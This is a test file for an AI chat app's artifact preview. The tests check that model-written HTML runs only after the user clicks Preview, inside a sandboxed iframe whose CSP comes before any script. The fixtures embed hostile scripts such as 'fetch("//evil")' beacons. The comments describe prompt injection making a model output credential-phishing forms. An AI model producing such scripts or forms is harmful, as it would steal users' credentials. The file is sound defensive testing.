import { describe, it, expect, afterEach, beforeEach } from 'vitest';
import { getSegmentRenderer, aparteGlobalConfig } from '@aparte/core';
import { setupArtifacts } from '../index.js';

// Re-registered before each test: `aparteGlobalConfig.reset()` in the teardowns
// below forgets the tool and the grammar, and the card is what every test mounts.
beforeEach(() => { setupArtifacts(); });

/**
 * A previewable artifact must not execute the model's code until the user asks.
 *
 * The card used to mount `<iframe sandbox="allow-scripts" srcdoc="…">` as soon as
 * the artifact was not streaming — which is every render of a completed artifact,
 * so reloading a persisted conversation ran the model's JS with no gesture at
 * all. The frame is sandboxed, so this is not origin XSS; it is a live
 * prompt-injection surface. A poisoned document or tool result can make the model
 * emit a credential-phishing form that renders inside the trusted chat chrome,
 * with `fetch()` to any origin working.
 *
 * Hiding the pane with CSS is not a fix: a display:none iframe still loads and
 * still runs scripts. The frame has to be absent from the DOM.
 *
 * This is ratified decision #8 applied to a tier-(c) affordance — content the app
 * did not produce does not get to act on its own.
 */
const ARTIFACT = {
    id: 'a1', type: 'artifact', mimeType: 'text/html', artifactType: 'html',
    title: 'Q3 Report', isStreaming: false,
    content: '<h1>hi</h1><script>parent.__pwned = true;</script>',
} as never;

function mount(segment: unknown = ARTIFACT) {
    const renderer = getSegmentRenderer('artifact')!;
    const host = document.createElement('div');
    host.innerHTML = renderer.render(segment as never) as string;
    document.body.appendChild(host);
    const card = host.firstElementChild as HTMLElement;
    renderer.setup?.(card, segment as never);
    return { host, card };
}

describe('artifact preview — requires a user gesture', () => {
    afterEach(() => { aparteGlobalConfig.reset(); document.body.innerHTML = ''; });

    it('mounts no iframe for a completed artifact', () => {
        const { card } = mount();
        expect(card.getAttribute('data-tab'), 'the code tab must be the one shown').toBe('code');
        expect(
            card.querySelector('iframe'),
            'the model\'s code was mounted and executed with no user gesture',
        ).toBeNull();
    });

    it('mounts the iframe when the user presses Preview, sandboxed and CSP-constrained', () => {
        const { card } = mount();

        const preview = card.querySelector<HTMLButtonElement>('[data-tab-target="preview"]');
        expect(preview, 'a previewable artifact should offer the tab').toBeTruthy();
        preview!.click();

        const frame = card.querySelector('iframe');
        expect(frame, 'pressing Preview should mount the frame').toBeTruthy();
        expect(frame!.getAttribute('sandbox')).toBe('allow-scripts');
        expect(frame!.getAttribute('csp'), 'the sandbox must not be able to beacon out').toBeTruthy();
        expect(card.getAttribute('data-tab')).toBe('preview');
    });

    it('does not mount a second frame on a second press', () => {
        const { card } = mount();
        const preview = card.querySelector<HTMLButtonElement>('[data-tab-target="preview"]');
        preview!.click();
        card.querySelector<HTMLButtonElement>('[data-tab-target="code"]')!.click();
        preview!.click();
        expect(card.querySelectorAll('iframe')).toHaveLength(1);
    });

    it('offers no preview tab for a kind that has none', () => {
        const { card } = mount({
            id: 'a2', type: 'artifact', mimeType: 'text/csv', artifactType: 'csv',
            content: 'a,b', isStreaming: false,
        });
        expect(card.querySelector('[data-tab-target="preview"]')).toBeNull();
    });
});

describe('artifact preview — the containment is declared twice', () => {
    afterEach(() => { aparteGlobalConfig.reset(); document.body.innerHTML = ''; });

    it('puts the policy inside the document too, since the csp attribute is Chromium-only', () => {
        const { card } = mount();
        card.querySelector<HTMLButtonElement>('[data-tab-target="preview"]')!.click();

        const srcdoc = card.querySelector('iframe')!.getAttribute('srcdoc') ?? '';
        expect(srcdoc).toContain('http-equiv="Content-Security-Policy"');
        expect(srcdoc).toContain("default-src &#039;none&#039;");
    });

    it('keeps the sandbox for a model-authored full document it cannot inject into', () => {
        const { card } = mount({
            id: 'a3', type: 'artifact', mimeType: 'text/html', artifactType: 'html',
            content: '<!doctype html><html><body>no head here</body></html>', isStreaming: false,
        });
        card.querySelector<HTMLButtonElement>('[data-tab-target="preview"]')!.click();

        const frame = card.querySelector('iframe')!;
        expect(frame.getAttribute('sandbox')).toBe('allow-scripts');
        expect(frame.getAttribute('csp')).toBeTruthy();
    });
});

describe('artifact preview — the gesture mounts the LATEST content', () => {
    afterEach(() => { aparteGlobalConfig.reset(); document.body.innerHTML = ''; });

    /**
     * The first version of the gesture fix broke the feature for every streamed
     * artifact: `updateSegment()` REPLACES the segment object (`{...old, ...updates}`)
     * rather than mutating it, and because this renderer has an `update`, `setup()`
     * never runs again — so the click handler's closure kept the setup-time object
     * and the preview showed the partial content forever. Hence `latestSegment`.
     */
    it('previews the final content after streaming replaced the segment object', () => {
        const partial = {
            id: 'a2', type: 'artifact', mimeType: 'text/html', artifactType: 'html',
            title: 'Report', isStreaming: true, content: '<p>PARTIAL</p>',
        } as never;

        const { card } = mount(partial);
        const renderer = getSegmentRenderer('artifact')!;

        // Exactly what the bubble does when the stream completes.
        const final = { ...(partial as object), content: '<p>FINAL</p>', isStreaming: false } as never;
        renderer.update?.(card, final);

        card.querySelector<HTMLButtonElement>('[data-tab-target="preview"]')!.click();

        const frame = card.querySelector('iframe');
        expect(frame, 'the gesture should have mounted an iframe').toBeTruthy();
        const srcdoc = frame!.getAttribute('srcdoc') ?? '';
        expect(srcdoc).toContain('FINAL');
        expect(srcdoc).not.toContain('PARTIAL');
    });
});

describe('artifact preview — the portable CSP reaches every document shape', () => {
    afterEach(() => { aparteGlobalConfig.reset(); document.body.innerHTML = ''; });

    /**
     * The `csp` iframe attribute is Chromium-only, so the `<meta http-equiv>` is
     * the half that covers Firefox and Safari. It used to be inserted only after an
     * existing `<head>` — leaving a model-authored `<!doctype html>` document, which
     * is passed through verbatim, with no policy at all on those engines.
     */
    const srcdocFor = (content: string): string => {
        const segment = {
            id: `a-${content.length}`, type: 'artifact', mimeType: 'text/html',
            artifactType: 'html', title: 'Doc', isStreaming: false, content,
        } as never;
        const { card } = mount(segment);
        card.querySelector<HTMLButtonElement>('[data-tab-target="preview"]')!.click();
        return card.querySelector('iframe')!.getAttribute('srcdoc') ?? '';
    };

    it('a full document with no <head> of its own still gets the policy', () => {
        const srcdoc = srcdocFor('<!doctype html><html><body>hi</body></html>');
        expect(srcdoc).toContain('http-equiv="Content-Security-Policy"');
        // WHERE the head lands stopped mattering once the policy moved to the front:
        // what matters is that nothing executable precedes it. This assertion used to
        // pin the old placement, which is the placement that had the hole.
        expect(srcdoc.indexOf('Content-Security-Policy'), 'the policy comes before the model markup')
            .toBeLessThan(srcdoc.indexOf('<html'));
    });

    it('a document that BEGINS with <head> gets it too (index 0 is a match)', () => {
        const srcdoc = srcdocFor('<head></head><body>hi</body>');
        expect(srcdoc).toContain('http-equiv="Content-Security-Policy"');
    });

    it('a document with a <head> keeps the policy ahead of its content', () => {
        const srcdoc = srcdocFor('<!doctype html><html><head><title>T</title></head><body>hi</body></html>');
        expect(srcdoc).toContain('http-equiv="Content-Security-Policy"');
        expect(srcdoc.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc.indexOf('<title>'));
    });

    /**
     * A `<meta http-equiv>` policy governs only what FOLLOWS it. So the question is
     * never "is the meta there" — the three assertions above all answer that, and all
     * three passed while the hole was open — it is "is anything executable ahead of
     * it".
     *
     * The model writes the document. It may put a `<script>` before its own
     * `<head>`, or before `<html>`, and the parser hoists that script into an
     * implicitly-opened head where it sits EARLIER in document order than a meta
     * inserted after the tag the model declared later. Reproduced end to end in
     * Firefox, WebKit, and Chromium-without-the-csp-attribute: the beacon fired.
     *
     * The `csp` iframe attribute is Chromium-only, so on Firefox and Safari this
     * meta is the ONLY containment the frame has.
     */
    const scriptShapes: Array<[string, string]> = [
        ['a script before the model\'s own <head>', '<!doctype html><html><script>fetch("//evil")</script><head></head><body>x</body></html>'],
        ['a script before <html>', '<!doctype html><script>fetch("//evil")</script><html><head></head><body>x</body></html>'],
        ['a script and no head or html at all', '<!doctype html><script>fetch("//evil")</script><p>x</p>'],
        ['a script before a head the model opens late', '<html><script>fetch("//evil")</script><head><title>T</title></head></html>'],
    ];

    for (const [label, doc] of scriptShapes) {
        it(`puts the policy ahead of ${label}`, () => {
            const srcdoc = srcdocFor(doc);
            const policyAt = srcdoc.indexOf('Content-Security-Policy');
            const scriptAt = srcdoc.indexOf('<script');
            expect(policyAt, 'the policy must be present at all').toBeGreaterThan(-1);
            expect(scriptAt, 'the fixture must actually contain a script').toBeGreaterThan(-1);
            expect(policyAt, 'a meta CSP governs only what follows it').toBeLessThan(scriptAt);
        });
    }
});
